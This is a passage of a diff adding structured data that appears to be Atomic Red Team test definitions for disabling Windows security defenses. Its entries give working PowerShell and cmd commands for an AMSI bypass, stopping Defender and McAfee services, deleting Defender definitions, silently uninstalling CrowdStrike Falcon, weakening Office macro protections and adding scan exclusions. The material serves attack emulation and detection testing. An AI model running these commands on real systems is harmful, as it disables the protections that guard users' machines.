+                                                                                                       'bypass '
+                                                                                                       'AMSI '
+                                                                                                       'inspection '
+                                                                                                       'is '
+                                                                                                       'it '
+                                                                                                       'patch '
+                                                                                                       'the '
+                                                                                                       'dll '
+                                                                                                       'in '
+                                                                                                       'memory '
+                                                                                                       'setting '
+                                                                                                       'the '
+                                                                                                       '"amsiInitFailed" '
+                                                                                                       'function '
+                                                                                                       'to '
+                                                                                                       'true.\n'
+                                                                                                       'Upon '
+                                                                                                       'execution, '
+                                                                                                       'no '
+                                                                                                       'output '
+                                                                                                       'is '
+                                                                                                       'displayed.\n'
+                                                                                                       '\n'
+                                                                                                       'https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/\n',
+                                                                                        'executor': {'cleanup_command': "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$false)\n",
+                                                                                                     'command': "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n",
+                                                                                                     'name': 'powershell'},
+                                                                                        'name': 'AMSI '
+                                                                                                'Bypass '
+                                                                                                '- '
+                                                                                                'AMSI '
+                                                                                                'InitFailed',
+                                                                                        'supported_platforms': ['windows']},
+                                                                                       {'auto_generated_guid': '13f09b91-c953-438e-845b-b585e51cac9b',
+                                                                                        'description': 'With '
+                                                                                                       'administrative '
+                                                                                                       'rights, '
+                                                                                                       'an '
+                                                                                                       'adversary '
+                                                                                                       'can '
+                                                                                                       'remove '
+                                                                                                       'the '
+                                                                                                       'AMSI '
+                                                                                                       'Provider '
+                                                                                                       'registry '
+                                                                                                       'key '
+                                                                                                       'in '
+                                                                                                       'HKLM\\Software\\Microsoft\\AMSI '
+                                                                                                       'to '
+                                                                                                       'disable '
+                                                                                                       'AMSI '
+                                                                                                       'inspection.\n'
+                                                                                                       'This '
+                                                                                                       'test '
+                                                                                                       'removes '
+                                                                                                       'the '
+                                                                                                       'Windows '
+                                                                                                       'Defender '
+                                                                                                       'provider '
+                                                                                                       'registry '
+                                                                                                       'key. '
+                                                                                                       'Upon '
+                                                                                                       'execution, '
+                                                                                                       'no '
+                                                                                                       'output '
+                                                                                                       'is '
+                                                                                                       'displayed.\n'
+                                                                                                       'Open '
+                                                                                                       'Registry '
+                                                                                                       'Editor '
+                                                                                                       'and '
+                                                                                                       'navigate '
+                                                                                                       'to '
+                                                                                                       '"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\" '
+                                                                                                       'to '
+                                                                                                       'verify '
+                                                                                                       'that '
+                                                                                                       'it '
+                                                                                                       'is '
+                                                                                                       'gone.\n',
+                                                                                        'executor': {'cleanup_command': 'New-Item '
+                                                                                                                        '-Path '
+                                                                                                                        '"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers" '
+                                                                                                                        '-Name '
+                                                                                                                        '"{2781761E-28E0-4109-99FE-B9D127C57AFE}" '
+                                                                                                                        '-ErrorAction '
+                                                                                                                        'Ignore '
+                                                                                                                        '| '
+                                                                                                                        'Out-Null\n',
+                                                                                                     'command': 'Remove-Item '
+                                                                                                                '-Path '
+                                                                                                                '"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\{2781761E-28E0-4109-99FE-B9D127C57AFE}" '
+                                                                                                                '-Recurse\n',
+                                                                                                     'elevation_required': True,
+                                                                                                     'name': 'powershell'},
+                                                                                        'name': 'AMSI '
+                                                                                                'Bypass '
+                                                                                                '- '
+                                                                                                'Remove '
+                                                                                                'AMSI '
+                                                                                                'Provider '
+                                                                                                'Reg '
+                                                                                                'Key',
+                                                                                        'supported_platforms': ['windows']},
+                                                                                       {'auto_generated_guid': 'a1230893-56ac-4c81-b644-2108e982f8f5',
+                                                                                        'description': 'With '
+                                                                                                       'administrative '
+                                                                                                       'rights, '
+                                                                                                       'an '
+                                                                                                       'adversary '
+                                                                                                       'can '
+                                                                                                       'disable '
+                                                                                                       'Windows '
+                                                                                                       'Services '
+                                                                                                       'related '
+                                                                                                       'to '
+                                                                                                       'security '
+                                                                                                       'products. '
+                                                                                                       'This '
+                                                                                                       'test '
+                                                                                                       'requires '
+                                                                                                       'McAfeeDLPAgentService '
+                                                                                                       'to '
+                                                                                                       'be '
+                                                                                                       'installed.\n'
+                                                                                                       'Change '
+                                                                                                       'the '
+                                                                                                       'service_name '
+                                                                                                       'input '
+                                                                                                       'argument '
+                                                                                                       'for '
+                                                                                                       'your '
+                                                                                                       'AV '
+                                                                                                       'solution. '
+                                                                                                       'Upon '
+                                                                                                       'exeuction, '
+                                                                                                       'infomration '
+                                                                                                       'will '
+                                                                                                       'be '
+                                                                                                       'displayed '
+                                                                                                       'stating '
+                                                                                                       'the '
+                                                                                                       'status '
+                                                                                                       'of '
+                                                                                                       'the '
+                                                                                                       'service.\n'
+                                                                                                       'To '
+                                                                                                       'verify '
+                                                                                                       'that '
+                                                                                                       'the '
+                                                                                                       'service '
+                                                                                                       'has '
+                                                                                                       'stopped, '
+                                                                                                       'run '
+                                                                                                       '"sc '
+                                                                                                       'query '
+                                                                                                       'McAfeeDLPAgentService"\n',
+                                                                                        'executor': {'cleanup_command': 'sc.exe '
+                                                                                                                        'config '
+                                                                                                                        '#{service_name} '
+                                                                                                                        'start= '
+                                                                                                                        'auto '
+                                                                                                                        '>nul '
+                                                                                                                        '2>&1\n'
+                                                                                                                        'net.exe '
+                                                                                                                        'start '
+                                                                                                                        '#{service_name} '
+                                                                                                                        '>nul '
+                                                                                                                        '2>&1\n',
+                                                                                                     'command': 'net.exe '
+                                                                                                                'stop '
+                                                                                                                '#{service_name}\n'
+                                                                                                                'sc.exe '
+                                                                                                                'config '
+                                                                                                                '#{service_name} '
+                                                                                                                'start= '
+                                                                                                                'disabled\n',
+                                                                                                     'elevation_required': True,
+                                                                                                     'name': 'command_prompt'},
+                                                                                        'input_arguments': {'service_name': {'default': 'McAfeeDLPAgentService',
+                                                                                                                             'description': 'The '
+                                                                                                                                            'name '
+                                                                                                                                            'of '
+                                                                                                                                            'the '
+                                                                                                                                            'service '
+                                                                                                                                            'to '
+                                                                                                                                            'stop',
+                                                                                                                             'type': 'String'}},
+                                                                                        'name': 'Disable '
+                                                                                                'Arbitrary '
+                                                                                                'Security '
+                                                                                                'Windows '
+                                                                                                'Service',
+                                                                                        'supported_platforms': ['windows']},
+                                                                                       {'auto_generated_guid': '6b8df440-51ec-4d53-bf83-899591c9b5d7',
+                                                                                        'description': 'Attempting '
+                                                                                                       'to '
+                                                                                                       'disable '
+                                                                                                       'scheduled '
+                                                                                                       'scanning '
+                                                                                                       'and '
+                                                                                                       'other '
+                                                                                                       'parts '
+                                                                                                       'of '
+                                                                                                       'windows '
+                                                                                                       'defender '
+                                                                                                       'atp. '
+                                                                                                       'Upon '
+                                                                                                       'execution '
+                                                                                                       'Virus '
+                                                                                                       'and '
+                                                                                                       'Threat '
+                                                                                                       'Protection '
+                                                                                                       'will '
+                                                                                                       'show '
+                                                                                                       'as '
+                                                                                                       'disabled\n'
+                                                                                                       'in '
+                                                                                                       'Windows '
+                                                                                                       'settings.\n',
+                                                                                        'executor': {'cleanup_command': 'Set-MpPreference '
+                                                                                                                        '-DisableRealtimeMonitoring '
+                                                                                                                        '0\n'
+                                                                                                                        'Set-MpPreference '
+                                                                                                                        '-DisableBehaviorMonitoring '
+                                                                                                                        '0\n'
+                                                                                                                        'Set-MpPreference '
+                                                                                                                        '-DisableScriptScanning '
+                                                                                                                        '0\n'
+                                                                                                                        'Set-MpPreference '
+                                                                                                                        '-DisableBlockAtFirstSeen '
+                                                                                                                        '0\n',
+                                                                                                     'command': 'Set-MpPreference '
+                                                                                                                '-DisableRealtimeMonitoring '
+                                                                                                                '1\n'
+                                                                                                                'Set-MpPreference '
+                                                                                                                '-DisableBehaviorMonitoring '
+                                                                                                                '1\n'
+                                                                                                                'Set-MpPreference '
+                                                                                                                '-DisableScriptScanning '
+                                                                                                                '1\n'
+                                                                                                                'Set-MpPreference '
+                                                                                                                '-DisableBlockAtFirstSeen '
+                                                                                                                '1\n',
+                                                                                                     'elevation_required': True,
+                                                                                                     'name': 'powershell'},
+                                                                                        'name': 'Tamper '
+                                                                                                'with '
+                                                                                                'Windows '
+                                                                                                'Defender '
+                                                                                                'ATP '
+                                                                                                'PowerShell',
+                                                                                        'supported_platforms': ['windows']},
+                                                                                       {'auto_generated_guid': 'aa875ed4-8935-47e2-b2c5-6ec00ab220d2',
+                                                                                        'description': 'Attempting '
+                                                                                                       'to '
+                                                                                                       'disable '
+                                                                                                       'scheduled '
+                                                                                                       'scanning '
+                                                                                                       'and '
+                                                                                                       'other '
+                                                                                                       'parts '
+                                                                                                       'of '
+                                                                                                       'windows '
+                                                                                                       'defender '
+                                                                                                       'atp. '
+                                                                                                       'These '
+                                                                                                       'commands '
+                                                                                                       'must '
+                                                                                                       'be '
+                                                                                                       'run '
+                                                                                                       'as '
+                                                                                                       'System, '
+                                                                                                       'so '
+                                                                                                       'they '
+                                                                                                       'still '
+                                                                                                       'fail '
+                                                                                                       'as '
+                                                                                                       'administrator.\n'
+                                                                                                       'However, '
+                                                                                                       'adversaries '
+                                                                                                       'do '
+                                                                                                       'attempt '
+                                                                                                       'to '
+                                                                                                       'perform '
+                                                                                                       'this '
+                                                                                                       'action '
+                                                                                                       'so '
+                                                                                                       'monitoring '
+                                                                                                       'for '
+                                                                                                       'these '
+                                                                                                       'command '
+                                                                                                       'lines '
+                                                                                                       'can '
+                                                                                                       'help '
+                                                                                                       'alert '
+                                                                                                       'to '
+                                                                                                       'other '
+                                                                                                       'bad '
+                                                                                                       'things '
+                                                                                                       'going '
+                                                                                                       'on. '
+                                                                                                       'Upon '
+                                                                                                       'execution, '
+                                                                                                       '"Access '
+                                                                                                       'Denied"\n'
+                                                                                                       'will '
+                                                                                                       'be '
+                                                                                                       'displayed '
+                                                                                                       'twice '
+                                                                                                       'and '
+                                                                                                       'the '
+                                                                                                       'WinDefend '
+                                                                                                       'service '
+                                                                                                       'status '
+                                                                                                       'will '
+                                                                                                       'be '
+                                                                                                       'displayed.\n',
+                                                                                        'executor': {'cleanup_command': 'sc '
+                                                                                                                        'start '
+                                                                                                                        'WinDefend '
+                                                                                                                        '>nul '
+                                                                                                                        '2>&1\n'
+                                                                                                                        'sc '
+                                                                                                                        'config '
+                                                                                                                        'WinDefend '
+                                                                                                                        'start=enabled '
+                                                                                                                        '>nul '
+                                                                                                                        '2>&1\n',
+                                                                                                     'command': 'sc '
+                                                                                                                'stop '
+                                                                                                                'WinDefend\n'
+                                                                                                                'sc '
+                                                                                                                'config '
+                                                                                                                'WinDefend '
+                                                                                                                'start=disabled\n'
+                                                                                                                'sc '
+                                                                                                                'query '
+                                                                                                                'WinDefend\n',
+                                                                                                     'elevation_required': True,
+                                                                                                     'name': 'command_prompt'},
+                                                                                        'name': 'Tamper '
+                                                                                                'with '
+                                                                                                'Windows '
+                                                                                                'Defender '
+                                                                                                'Command '
+                                                                                                'Prompt',
+                                                                                        'supported_platforms': ['windows']},
+                                                                                       {'auto_generated_guid': '1b3e0146-a1e5-4c5c-89fb-1bb2ffe8fc45',
+                                                                                        'description': 'Disable '
+                                                                                                       'Windows '
+                                                                                                       'Defender '
+                                                                                                       'from '
+                                                                                                       'starting '
+                                                                                                       'after '
+                                                                                                       'a '
+                                                                                                       'reboot. '
+                                                                                                       'Upen '
+                                                                                                       'execution, '
+                                                                                                       'if '
+                                                                                                       'the '
+                                                                                                       'computer '
+                                                                                                       'is '
+                                                                                                       'rebooted '
+                                                                                                       'the '
+                                                                                                       'entire '
+                                                                                                       'Virus '
+                                                                                                       'and '
+                                                                                                       'Threat '
+                                                                                                       'protection '
+                                                                                                       'window '
+                                                                                                       'in '
+                                                                                                       'Settings '
+                                                                                                       'will '
+                                                                                                       'be\n'
+                                                                                                       'grayed '
+                                                                                                       'out '
+                                                                                                       'and '
+                                                                                                       'have '
+                                                                                                       'no '
+                                                                                                       'info.\n',
+                                                                                        'executor': {'cleanup_command': 'Set-ItemProperty '
+                                                                                                                        '"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows '
+                                                                                                                        'Defender" '
+                                                                                                                        '-Name '
+                                                                                                                        'DisableAntiSpyware '
+                                                                                                                        '-Value '
+                                                                                                                        '0\n',
+                                                                                                     'command': 'Set-ItemProperty '
+                                                                                                                '"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows '
+                                                                                                                'Defender" '
+                                                                                                                '-Name '
+                                                                                                                'DisableAntiSpyware '
+                                                                                                                '-Value '
+                                                                                                                '1\n',
+                                                                                                     'elevation_required': True,
+                                                                                                     'name': 'powershell'},
+                                                                                        'name': 'Tamper '
+                                                                                                'with '
+                                                                                                'Windows '
+                                                                                                'Defender '
+                                                                                                'Registry',
+                                                                                        'supported_platforms': ['windows']},
+                                                                                       {'auto_generated_guid': '6f5fb61b-4e56-4a3d-a8c3-82e13686c6d7',
+                                                                                        'description': 'Gorgon '
+                                                                                                       'group '
+                                                                                                       'may '
+                                                                                                       'disable '
+                                                                                                       'Office '
+                                                                                                       'security '
+                                                                                                       'features '
+                                                                                                       'so '
+                                                                                                       'that '
+                                                                                                       'their '
+                                                                                                       'code '
+                                                                                                       'can '
+                                                                                                       'run. '
+                                                                                                       'Upon '
+                                                                                                       'execution, '
+                                                                                                       'an '
+                                                                                                       'external '
+                                                                                                       'document '
+                                                                                                       'will '
+                                                                                                       'not\n'
+                                                                                                       'show '
+                                                                                                       'any '
+                                                                                                       'warning '
+                                                                                                       'before '
+                                                                                                       'editing '
+                                                                                                       'the '
+                                                                                                       'document.\n'
+                                                                                                       '\n'
+                                                                                                       '\n'
+                                                                                                       'https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/\n',
+                                                                                        'executor': {'cleanup_command': 'Remove-ItemProperty '
+                                                                                                                        '-Path '
+                                                                                                                        '"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security" '
+                                                                                                                        '-Name '
+                                                                                                                        '"VBAWarnings" '
+                                                                                                                        '-ErrorAction '
+                                                                                                                        'Ignore '
+                                                                                                                        '| '
+                                                                                                                        'Out-Null\n'
+                                                                                                                        'Remove-Item '
+                                                                                                                        '-Path '
+                                                                                                                        '"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView" '
+                                                                                                                        '-ErrorAction '
+                                                                                                                        'Ignore\n',
+                                                                                                     'command': 'New-Item '
+                                                                                                                '-Path '
+                                                                                                                '"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel"\n'
+                                                                                                                'New-Item '
+                                                                                                                '-Path '
+                                                                                                                '"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security"\n'
+                                                                                                                'New-Item '
+                                                                                                                '-Path '
+                                                                                                                '"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView"\n'
+                                                                                                                'New-ItemProperty '
+                                                                                                                '-Path '
+                                                                                                                '"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security" '
+                                                                                                                '-Name '
+                                                                                                                '"VBAWarnings" '
+                                                                                                                '-Value '
+                                                                                                                '"1" '
+                                                                                                                '-PropertyType '
+                                                                                                                '"Dword"\n'
+                                                                                                                'New-ItemProperty '
+                                                                                                                '-Path '
+                                                                                                                '"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView" '
+                                                                                                                '-Name '
+                                                                                                                '"DisableInternetFilesInPV" '
+                                                                                                                '-Value '
+                                                                                                                '"1" '
+                                                                                                                '-PropertyType '
+                                                                                                                '"Dword"\n'
+                                                                                                                'New-ItemProperty '
+                                                                                                                '-Path '
+                                                                                                                '"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView" '
+                                                                                                                '-Name '
+                                                                                                                '"DisableUnsafeLocationsInPV" '
+                                                                                                                '-Value '
+                                                                                                                '"1" '
+                                                                                                                '-PropertyType '
+                                                                                                                '"Dword"\n'
+                                                                                                                'New-ItemProperty '
+                                                                                                                '-Path '
+                                                                                                                '"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView" '
+                                                                                                                '-Name '
+                                                                                                                '"DisableAttachementsInPV" '
+                                                                                                                '-Value '
+                                                                                                                '"1" '
+                                                                                                                '-PropertyType '
+                                                                                                                '"Dword"\n',
+                                                                                                     'name': 'powershell'},
+                                                                                        'name': 'Disable '
+                                                                                                'Microsoft '
+                                                                                                'Office '
+                                                                                                'Security '
+                                                                                                'Features',
+                                                                                        'supported_platforms': ['windows']},
+                                                                                       {'auto_generated_guid': '3d47daaa-2f56-43e0-94cc-caf5d8d52a68',
+                                                                                        'description': 'Removing '
+                                                                                                       'definition '
+                                                                                                       'files '
+                                                                                                       'would '
+                                                                                                       'cause '
+                                                                                                       'ATP '
+                                                                                                       'to '
+                                                                                                       'not '
+                                                                                                       'fire '
+                                                                                                       'for '
+                                                                                                       'AntiMalware. '
+                                                                                                       'Check '
+                                                                                                       'MpCmdRun.exe '
+                                                                                                       'man '
+                                                                                                       'page '
+                                                                                                       'for '
+                                                                                                       'info '
+                                                                                                       'on '
+                                                                                                       'all '
+                                                                                                       'arguments.\n'
+                                                                                                       'On '
+                                                                                                       'later '
+                                                                                                       'viersions '
+                                                                                                       'of '
+                                                                                                       'windows '
+                                                                                                       '(1909+) '
+                                                                                                       'this '
+                                                                                                       'command '
+                                                                                                       'fails '
+                                                                                                       'even '
+                                                                                                       'with '
+                                                                                                       'admin '
+                                                                                                       'due '
+                                                                                                       'to '
+                                                                                                       'inusfficient '
+                                                                                                       'privelages. '
+                                                                                                       'On '
+                                                                                                       'older '
+                                                                                                       'versions '
+                                                                                                       'of '
+                                                                                                       'windows '
+                                                                                                       'the\n'
+                                                                                                       'command '
+                                                                                                       'will '
+                                                                                                       'say '
+                                                                                                       'completed.\n'
+                                                                                                       '\n'
+                                                                                                       'https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/\n',
+                                                                                        'executor': {'command': '"C:\\Program '
+                                                                                                                'Files\\Windows '
+                                                                                                                'Defender\\MpCmdRun.exe" '
+                                                                                                                '-RemoveDefinitions '
+                                                                                                                '-All\n',
+                                                                                                     'elevation_required': True,
+                                                                                                     'name': 'command_prompt'},
+                                                                                        'name': 'Remove '
+                                                                                                'Windows '
+                                                                                                'Defender '
+                                                                                                'Definition '
+                                                                                                'Files',
+                                                                                        'supported_platforms': ['windows']},
+                                                                                       {'auto_generated_guid': 'ae753dda-0f15-4af6-a168-b9ba16143143',
+                                                                                        'description': 'Beginning '
+                                                                                                       'with '
+                                                                                                       'Powershell '
+                                                                                                       '6.0, '
+                                                                                                       'the '
+                                                                                                       'Stop-Service '
+                                                                                                       'cmdlet '
+                                                                                                       'sends '
+                                                                                                       'a '
+                                                                                                       'stop '
+                                                                                                       'message '
+                                                                                                       'to '
+                                                                                                       'the '
+                                                                                                       'Windows '
+                                                                                                       'Service '
+                                                                                                       'Controller '
+                                                                                                       'for '
+                                                                                                       'each '
+                                                                                                       'of '
+                                                                                                       'the '
+                                                                                                       'specified '
+                                                                                                       'services. '
+                                                                                                       'The '
+                                                                                                       'Remove-Service '
+                                                                                                       'cmdlet '
+                                                                                                       'removes '
+                                                                                                       'a '
+                                                                                                       'Windows '
+                                                                                                       'service '
+                                                                                                       'in '
+                                                                                                       'the '
+                                                                                                       'registry '
+                                                                                                       'and '
+                                                                                                       'in '
+                                                                                                       'the '
+                                                                                                       'service '
+                                                                                                       'database.\n',
+                                                                                        'executor': {'command': 'Stop-Service '
+                                                                                                                '-Name '
+                                                                                                                '#{service_name}\n'
+                                                                                                                'Remove-Service '
+                                                                                                                '-Name '
+                                                                                                                '#{service_name}\n',
+                                                                                                     'elevation_required': True,
+                                                                                                     'name': 'powershell'},
+                                                                                        'input_arguments': {'service_name': {'default': 'McAfeeDLPAgentService',
+                                                                                                                             'description': 'The '
+                                                                                                                                            'name '
+                                                                                                                                            'of '
+                                                                                                                                            'the '
+                                                                                                                                            'service '
+                                                                                                                                            'to '
+                                                                                                                                            'remove',
+                                                                                                                             'type': 'String'}},
+                                                                                        'name': 'Stop '
+                                                                                                'and '
+                                                                                                'Remove '
+                                                                                                'Arbitrary '
+                                                                                                'Security '
+                                                                                                'Windows '
+                                                                                                'Service',
+                                                                                        'supported_platforms': ['windows']},
+                                                                                       {'auto_generated_guid': 'b32b1ccf-f7c1-49bc-9ddd-7d7466a7b297',
+                                                                                        'description': 'Uninstall '
+                                                                                                       'Crowdstrike '
+                                                                                                       'Falcon. '
+                                                                                                       'If '
+                                                                                                       'the '
+                                                                                                       'WindowsSensor.exe '
+                                                                                                       'path '
+                                                                                                       'is '
+                                                                                                       'not '
+                                                                                                       'provided '
+                                                                                                       'as '
+                                                                                                       'an '
+                                                                                                       'argument '
+                                                                                                       'we '
+                                                                                                       'need '
+                                                                                                       'to '
+                                                                                                       'search '
+                                                                                                       'for '
+                                                                                                       'it. '
+                                                                                                       'Since '
+                                                                                                       'the '
+                                                                                                       'executable '
+                                                                                                       'is '
+                                                                                                       'located '
+                                                                                                       'in '
+                                                                                                       'a '
+                                                                                                       'folder '
+                                                                                                       'named '
+                                                                                                       'with '
+                                                                                                       'a '
+                                                                                                       'random '
+                                                                                                       'guid '
+                                                                                                       'we '
+                                                                                                       'need '
+                                                                                                       'to '
+                                                                                                       'identify '
+                                                                                                       'it '
+                                                                                                       'before '
+                                                                                                       'invoking '
+                                                                                                       'the '
+                                                                                                       'uninstaller.\n',
+                                                                                        'executor': {'command': 'if '
+                                                                                                                '(Test-Path '
+                                                                                                                '"#{falcond_path}") '
+                                                                                                                '{. '
+                                                                                                                '"#{falcond_path}" '
+                                                                                                                '/repair '
+                                                                                                                '/uninstall '
+                                                                                                                '/quiet '
+                                                                                                                '} '
+                                                                                                                'else '
+                                                                                                                '{ '
+                                                                                                                'Get-ChildItem '
+                                                                                                                '-Path '
+                                                                                                                '"C:\\ProgramData\\Package '
+                                                                                                                'Cache" '
+                                                                                                                '-Include '
+                                                                                                                '"WindowsSensor.exe" '
+                                                                                                                '-Recurse '
+                                                                                                                '| '
+                                                                                                                '% '
+                                                                                                                '{ '
+                                                                                                                '$sig=$(Get-AuthenticodeSignature '
+                                                                                                                '-FilePath '
+                                                                                                                '$_.FullName); '
+                                                                                                                'if '
+                                                                                                                '($sig.Status '
+                                                                                                                '-eq '
+                                                                                                                '"Valid" '
+                                                                                                                '-and '
+                                                                                                                '$sig.SignerCertificate.DnsNameList '
+                                                                                                                '-eq '
+                                                                                                                '"CrowdStrike, '
+                                                                                                                'Inc.") '
+                                                                                                                '{ '
+                                                                                                                '. '
+                                                                                                                '"$_" '
+                                                                                                                '/repair '
+                                                                                                                '/uninstall '
+                                                                                                                '/quiet; '
+                                                                                                                'break;}}}',
+                                                                                                     'elevation_required': True,
+                                                                                                     'name': 'powershell'},
+                                                                                        'input_arguments': {'falcond_path': {'default': 'C:\\ProgramData\\Package '
+                                                                                                                                        'Cache\\{7489ba93-b668-447f-8401-7e57a6fe538d}\\WindowsSensor.exe',
+                                                                                                                             'description': 'The '
+                                                                                                                                            'Crowdstrike '
+                                                                                                                                            'Windows '
+                                                                                                                                            'Sensor '
+                                                                                                                                            'path. '
+                                                                                                                                            'The '
+                                                                                                                                            'Guid '
+                                                                                                                                            'always '
+                                                                                                                                            'changes.',
+                                                                                                                             'type': 'path'}},
+                                                                                        'name': 'Uninstall '
+                                                                                                'Crowdstrike '
+                                                                                                'Falcon '
+                                                                                                'on '
+                                                                                                'Windows',
+                                                                                        'supported_platforms': ['windows']},
+                                                                                       {'auto_generated_guid': '0b19f4ee-de90-4059-88cb-63c800c683ed',
+                                                                                        'description': 'Malware '
+                                                                                                       'can '
+                                                                                                       'exclude '
+                                                                                                       'a '
+                                                                                                       'specific '
+                                                                                                       'path '
+                                                                                                       'from '
+                                                                                                       'being '
+                                                                                                       'scanned '
+                                                                                                       'and '
+                                                                                                       'evading '
+                                                                                                       'detection. \n'
+                                                                                                       'Upon '
+                                                                                                       'successul '
+                                                                                                       'execution, '
+                                                                                                       'the '
+                                                                                                       'file '
+                                                                                                       'provided '
+                                                                                                       'should '
+                                                                                                       'be '
+                                                                                                       'on '
+                                                                                                       'the '
+                                                                                                       'list '
+                                                                                                       'of '
+                                                                                                       'excluded '
+                                                                                                       'path. \n'
+                                                                                                       'To '
+                                                                                                       'check '
+                                                                                                       'the '
+                                                                                                       'exclusion '
+                                                                                                       'list '
+                                                                                                       'using '
+                                                                                                       'poweshell '
+                                                                                                       '(Get-MpPreference).ExclusionPath \n',
+                                                                                        'executor': {'cleanup_command': '$excludedpath= '
+                                                                                                                        '"#{excluded_folder}"\n'
+                                                                                                                        'Remove-MpPreference '
+                                                                                                                        '-ExclusionPath '
+                                                                                                                        '$excludedpath\n',
+                                                                                                     'command': '$excludedpath= '
+                                                                                                                '"#{excluded_folder}"\n'
+                                                                                                                'Add-MpPreference '
+                                                                                                                '-ExclusionPath '
+                                                                                                                '$excludedpath',
+                                                                                                     'elevation_required': True,
+                                                                                                     'name': 'powershell'},
+                                                                                        'input_arguments': {'excluded_folder': {'default': 'C:\\Temp',
+                                                                                                                                'description': 'This '
+                                                                                                                                               'folder '
+                                                                                                                                               'will '
+                                                                                                                                               'be '
+                                                                                                                                               'excluded '
+                                                                                                                                               'from '
+                                                                                                                                               'scanning',
+                                                                                                                                'type': 'String'}},
+                                                                                        'name': 'Tamper '
+                                                                                                'with '
+                                                                                                'Windows '
+                                                                                                'Defender '
+                                                                                                'Evade '
+                                                                                                'Scanning '
+                                                                                                '-Folder',
+                                                                                        'supported_platforms': ['windows']},
+                                                                                       {'auto_generated_guid': '315f4be6-2240-4552-b3e1-d1047f5eecea',
+                                                                                        'description': 'Malware '
+                                                                                                       'can '
+                                                                                                       'exclude '
+                                                                                                       'specific '
+                                                                                                       'extensions '
+                                                                                                       'from '
+                                                                                                       'being '
+                                                                                                       'scanned '
+                                                                                                       'and '
+                                                                                                       'evading '
+                                                                                                       'detection. \n'
+                                                                                                       'Upon '
+                                                                                                       'successful '
+                                                                                                       'execution, '
+                                                                                                       'the '
+                                                                                                       'extension(s) '
+                                                                                                       'should '
+                                                                                                       'be '
+                                                                                                       'on '
+                                                                                                       'the '
+                                                                                                       'list '
+                                                                                                       'of '
+                                                                                                       'excluded '
+                                                                                                       'extensions.\n'
+                                                                                                       'To '
+                                                                                                       'check '
+                                                                                                       'the '
+                                                                                                       'exclusion '
+                                                                                                       'list '
+                                                                                                       'using '
+                                                                                                       'poweshell  '
+                                                                                                       '(Get-MpPreference).ExclusionExtension.\n',
+                                                                                        'executor': {'cleanup_command': '$excludedExts= '
+                                                                                                                        '"#{excluded_exts}"\n'
+                                                                                                                        'Remove-MpPreference '
+                                                                                                                        '-ExclusionExtension  '
+                                                                                                                        '$excludedExts\n',
+                                                                                                     'command': '$excludedExts= '
+                                                                                                                '"#{excluded_exts}"\n'
+                                                                                                                'Add-MpPreference '
+                                                                                                                '-ExclusionExtension  '
+                                                                                                                '$excludedExts',
+                                                                                                     'elevation_required': True,
+                                                                                                     'name': 'powershell'},
+                                                                                        'input_arguments': {'excluded_exts': {'default': '.exe',
+                                                                                                                              'description': 'A '
+                                                                                                                                             'list '
+                                                                                                                                             'of '
+                                                                                                                                             'extension '
+                                                                                                                                             'to '
+                                                                                                                                             'exclude '
+                                                                                                                                             'from '
+                                                                                                                                             'scanning',
+                                                                                                                              'type': 'string'}},
+                                                                                        'name': 'Tamper '
+                                                                                                'with '
+                                                                                                'Windows '
+                                                                                                'Defender '
+                                                                                                'Evade '
+                                                                                                'Scanning '
+                                                                                                '-Extension',
+                                                                                        'supported_platforms': ['windows']},
+                                                                                       {'auto_generated_guid': 'a123ce6a-3916-45d6-ba9c-7d4081315c27',
+                                                                                        'description': 'Malware '
+                                                                                                       'can '
+                                                                                                       'exclude '
+                                                                                                       'specific '
+                                                                                                       'processes '
+                                                                                                       'from '
+                                                                                                       'being '
+                                                                                                       'scanned '
+                                                                                                       'and '
+                                                                                                       'evading '
+                                                                                                       'detection.\n'
+                                                                                                       'Upon '
+                                                                                                       'successful '
+                                                                                                       'execution, '
+                                                                                                       'the '
+                                                                                                       'process(es) '
+                                                                                                       'should '
+                                                                                                       'be '
+                                                                                                       'on '
+                                                                                                       'the '
+                                                                                                       'list '
+                                                                                                       'of '
+                                                                                                       'excluded '
+                                                                                                       'processes. \n'
+                                                                                                       'To '
+                                                                                                       'check '
+                                                                                                       'the '
+                                                                                                       'exclusion '
+                                                                                                       'list '
+                                                                                                       'using '
+                                                                                                       'poweshell  '
+                                                                                                       '(Get-MpPreference).ExclusionProcess."\n',
+                                                                                        'executor': {'cleanup_command': '$excludedProcess '
+                                                                                                                        '= '
+                                                                                                                        '"#{excluded_process}"\n'
+                                                                                                                        'Remove-MpPreference '
+                                                                                                                        '-ExclusionProcess  '
+                                                                                                                        '$excludedProcess\n',
+                                                                                                     'command': '$excludedProcess '
+                                                                                                                '= '
+                                                                                                                '"#{excluded_process}"\n'
+                                                                                                                'Add-MpPreference '
+                                                                                                                '-ExclusionProcess '
+                                                                                                                '$excludedProcess',
+                                                                                                     'elevation_required': True,
+                                                                                                     'name': 'powershell'},
+                                                                                        'input_arguments': {'excluded_process': {'default': 'outlook.exe',
+                                                                                                                                 'description': 'A '
+                                                                                                                                                'list '
+                                                                                                                                                'of '
+                                                                                                                                                'processes '
+                                                                                                                                                'to '
+                                                                                                                                                'exclude '
+                                                                                                                                                'from '
+                                                                                                                                                'scanning',
+                                                                                                                                 'type': 'string'}},
+                                                                                        'name': 'Tamper '
+                                                                                                'with '
